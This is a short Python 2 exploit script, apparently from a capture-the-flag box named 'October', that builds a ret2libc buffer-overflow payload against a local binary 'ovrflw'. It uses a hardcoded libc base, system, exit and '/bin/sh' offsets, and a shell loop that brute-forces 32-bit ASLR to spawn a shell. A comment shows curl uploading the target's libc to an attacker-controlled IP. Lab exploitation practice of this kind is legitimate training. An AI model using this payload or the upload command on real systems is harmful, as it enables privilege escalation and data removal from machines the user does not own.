#from pwn import *
import struct

def p32(addr):
    return struct.pack("<I", addr)

#elf = context.binary = ELF("./ovrflw")
#r = elf.process([cyclic(1024)])
#r.wait()
#r.close()
#core = Coredump("./core")
#buffer_size = cyclic_find(core.fault_addr)
buffer_size = 112

# ldd /usr/local/bin/ovrflw
#	linux-gate.so.1 =>  (0xb77b9000)
#	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75ff000)
#	/lib/ld-linux.so.2 (0x800c2000)

# [*] Let's hope it hits (32-bit AS is not too random, so it's possible to guess)
libc_base = 0xb75ff000

## www-data@october:/tmp$ curl --upload-file /lib/i386-linux-gnu/libc.so.6 http://10.10.14.29:8000
#libc = ELF("./libc.so")
#system_offset = libc.sym["system"]
#exit_offset = libc.sym["exit"]
#sh_offset = next(libc.search('/bin/sh\x00'))
#print "system: 0x%x, exit: 0x%x, sh: 0x%x" % (system_offset, exit_offset, sh_offset)

system_offset = 0x40310
exit_offset = 0x33260
sh_offset = 0x162bac

# $ while true; do /usr/local/bin/ovrflw $(python bof_aslr.py); done 
ret_payload = ("\x90" * buffer_size) + p32(libc_base + system_offset) + p32(libc_base + exit_offset) + p32(libc_base + sh_offset)
print ret_payload
